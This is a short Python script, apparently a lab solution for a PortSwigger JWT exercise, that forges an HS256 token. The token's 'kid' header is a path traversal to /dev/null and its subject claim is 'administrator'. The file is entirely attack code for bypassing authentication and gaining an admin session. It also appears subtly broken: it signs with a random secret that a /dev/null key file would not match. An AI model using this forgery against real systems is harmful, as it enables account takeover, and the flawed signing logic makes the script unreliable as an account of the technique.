import jwt
import json
import secrets
import base64
import os
from typing import Dict

class SymmetricKeyGenerator:
    def __init__(self):
        self.key_size = 32  # 256 bits for HS256
        
    def generate_secret_key(self) -> bytes:
        """Generate random secret key"""
        return secrets.token_bytes(self.key_size)
    
    def secret_to_jwk(self, secret: bytes) -> Dict:
        """Convert secret key to JWK format"""
        encoded_secret = base64.urlsafe_b64encode(secret).decode('utf-8').rstrip('=')
        return {
            "kty": "oct",
            "k": encoded_secret,
            "alg": "HS256",
            "use": "sig"
        }
    
    def forge_jwt(self, secret: bytes) -> str:
        """Create a JWT with specified payload using HMAC-SHA256"""
        header = {
            "kid": "../../../../../../../dev/null",
            "alg": "HS256",
            "typ": "JWT"
        }
        
        payload = {
            "iss": "portswigger",
            "exp": 1740413131,
            "sub": "administrator"
        }
        
        token = jwt.encode(
            payload,
            secret,
            algorithm='HS256',
            headers=header
        )
        
        return token

def save_jwk_to_file(jwk: Dict, filename: str):
    """Save JWK to a file with debug information"""
    try:
        with open(filename, 'w') as f:
            json.dump(jwk, f, indent=2)
        print(f"\nSuccessfully saved JWK to {filename}")
        
        # Verify the file was created and read its contents
        with open(filename, 'r') as f:
            saved_content = f.read()
        print(f"\nVerified contents of {filename}:")
        print(saved_content)
        
    except Exception as e:
        print(f"\nError saving to {filename}: {str(e)}")
        print("Current working directory:", os.getcwd())

def main():
    # Create generator instance
    generator = SymmetricKeyGenerator()
    
    # Generate secret key
    print("Generating symmetric key...")
    secret_key = generator.generate_secret_key()
    
    # Convert to JWK format
    jwk = generator.secret_to_jwk(secret_key)
    
    # Save JWK to file
    save_jwk_to_file(jwk, 'symmetric.jwk')
    
    # Generate JWT
    token = generator.forge_jwt(secret_key)
    print("\nForged JWT:")
    print(token)
    
    # Display token parts
    parts = token.split('.')
    for i, part in enumerate(['HEADER', 'PAYLOAD', 'SIGNATURE']):
        if i < 2:  # Don't try to decode signature
            padding = '=' * (4 - len(parts[i]) % 4)
            decoded = json.loads(jwt.utils.base64url_decode(parts[i] + padding))
            print(f"\n{part}:")
            print(json.dumps(decoded, indent=2))

if __name__ == "__main__":
    main()